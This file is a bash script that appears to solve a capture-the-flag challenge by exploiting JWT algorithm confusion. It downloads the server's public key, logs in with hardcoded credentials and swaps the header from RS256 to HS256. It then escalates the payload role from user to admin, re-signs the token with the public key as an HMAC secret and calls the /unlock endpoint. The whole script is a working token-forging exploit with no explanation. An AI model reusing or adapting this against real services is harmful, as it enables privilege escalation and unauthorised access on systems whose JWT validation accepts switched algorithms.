#!/bin/bash

function base64url_encode {
	(if [ -z "$1" ]; then cat -; else echo -n "$1"; fi) |
		openssl base64 -e -A |
			sed s/\\+/-/g |
			sed s/\\//_/g |
			sed -E s/=+$//
}

function base64url_decode {
	INPUT=$(if [ -z "$1" ]; then echo -n $(cat -); else echo -n "$1"; fi)
	MOD=$(($(echo -n "$INPUT" | wc -c) % 4))
	PADDING=$(if [ $MOD -eq 2 ]; then echo -n '=='; elif [ $MOD -eq 3 ]; then echo -n '=' ; fi)
	echo -n "$INPUT$PADDING" |
		sed s/-/+/g |
		sed s/_/\\//g |
		openssl base64 -d -A
}

# Public Key
PB=$(curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem 2> /dev/null| xxd -p | tr -d "\\n")

# Original Token 
ori_token=$(curl -X POST -H "Content-Type: application/json" -d '{"username":"minion","password":"banana"}' http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login 2> /dev/null | cut -d ":" -f2 | sed 's/"//g' | sed 's/}//g' | cut -d "." -f1-2) 

# Token Header
hs_start=$(echo $ori_token | cut -d "." -f1 | base64 -d 2> /dev/null | sed 's/RS256/HS256/g' | base64url_encode)

# Token Payload
token=$(echo $ori_token | cut -d "." -f2 | base64 -d 2> /dev/null | sed 's/:"user/:"admin/g' | base64url_encode)

# Raw HMAC Signature
raw_hmac_sig=$(echo -n "$hs_start.$token" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$PB | cut -d '=' -f2 | xargs)

# Base64Url encoded JWT signature
hmac_sig=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$raw_hmac_sig')).replace('=','')\")")

# Resigned JWT Token
resigned_token=$hs_start.$token.$hmac_sig

echo -e "Header: $(base64url_decode $hs_start)\n"
echo -e "Payload: $(base64url_decode $token)\n"
echo -e "Signed Token: $resigned_token\n"

# Get flag
curl -H "Authorization: Bearer $resigned_token" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
